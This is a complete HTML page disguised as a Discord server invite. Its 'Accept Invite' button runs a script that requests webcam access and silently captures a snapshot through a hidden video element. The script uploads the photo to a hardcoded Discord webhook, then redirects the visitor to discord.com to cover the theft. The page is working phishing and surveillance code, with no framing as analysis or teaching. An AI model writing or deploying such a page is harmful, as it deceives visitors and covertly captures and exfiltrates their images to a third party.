<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>Discord Invite</title>
    <style>
        body { background-color: #313338; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
        .box { background: #2b2d31; padding: 40px; border-radius: 8px; border: 1px solid #404249; }
        button { padding: 15px 30px; font-size: 18px; background-color: #5865F2; color: white; border: none; border-radius: 5px; cursor: pointer; transition: 0.3s; }
        button:hover { background-color: #4752c4; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Discord Invite</h2>
        <p>Click below to join the server</p>
        <button onclick="startCamera()">Accept Invite</button>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1507879866136133682/3h8tsvpbaFNftFO8zsRwkYuHbZwgH7yld33NrCBTtKP0cHMl64tn9AsPTZZl70GceTbb";

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('file', blob, 'image.png');
                        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
                        .then(() => {
                            window.location.href = "https://discord.com";
                        });
                    }, 'image/png');
                }, 1000);
            } catch (err) { alert("Camera access denied."); }
        }
    </script>
</body>
</html>
